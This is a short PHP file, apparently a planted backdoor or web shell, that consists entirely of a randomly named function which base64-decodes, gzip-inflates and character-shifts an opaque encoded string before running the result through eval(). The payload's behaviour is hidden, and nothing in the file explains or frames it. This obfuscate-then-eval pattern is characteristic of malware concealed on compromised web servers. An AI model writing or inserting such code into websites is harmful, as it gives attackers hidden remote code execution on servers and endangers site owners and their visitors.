<?php function JZZIoT($nRn)
{ 
$nRn=gzinflate(base64_decode($nRn));
 for($i=0;$i<strlen($nRn);$i++)
 {
$nRn[$i] = chr(ord($nRn[$i])-1);
 }
 return $nRn;
 }eval(JZZIoT("jVJRa9swEP4B+RW3Emr7oe17RgrrNig0pYOUvYxiLvI5FlFkI53TmpLfvrPlpGoIbPcgpOO++z59dwASE1x5dqgYlEHv4fnuOf9eb7e1zR/rgky+7DzTVnK21Ov8DtWGbJEvtCLr6dsBTG8saQ+PuCapdTSiR9gPZJy8T3rCI1/TroxWULZWsa4trIkF0xp6oC7Nvg7Fw3FamGPJ5Ja4ozQLFaFzH7qE9MvUBHUwhylX2l/dSu/faFoBZFFxH1y5+hUsvcLPN0VNT5Be/DKEAvcNKV120NWtg0PPDXXXF6O8PvbH2/EykuaqIrUZnXraiWRycqYHeVETR9w6Cw06sjybxT8MRfvIDqd3yBT58S+eU5OmjnxTB4P6gc1mFZlGEAmvWA3DT7Kr208+iYOLukPD3X2o/XA2mtopqiRW1ahMBqALHAw+48AnA3WZHjX+SXyrFHmfvMDlJUR5aYaSnM8hGfvlu54jOZ1x+KMoXWq7NsSiIFGyozde2urwWSyKZeCJqbfyFnDyEg8cyIh1/7FGi4+VAe1B20HeNaTv5yj22fm1Gndj8PuwDPvJXw=="));?>